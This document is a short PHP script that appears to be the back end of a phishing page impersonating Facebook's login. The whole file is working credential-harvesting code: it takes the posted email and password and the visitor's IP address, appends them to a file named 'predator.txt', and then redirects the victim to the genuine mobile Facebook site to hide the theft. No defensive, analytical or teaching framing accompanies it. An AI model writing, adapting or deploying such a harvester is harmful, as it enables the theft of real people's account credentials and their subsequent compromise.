<?php

   $Correo=$_POST["email"];
   $Contraseña=$_POST["pass"];
   $ip = $_SERVER['REMOTE_ADDR'];
   $archivo = fopen("predator.txt","a");
   $datos= "#############################################"."\r\n"."Correo: ".$Correo."\r\n"."Clave: ".$Contraseña."\r\n"."Ip: ".$ip."\r\n"."#############################################";
fwrite($archivo,$datos);
fclose($archivo);


header("Location: https://m.facebook.com/");

?>
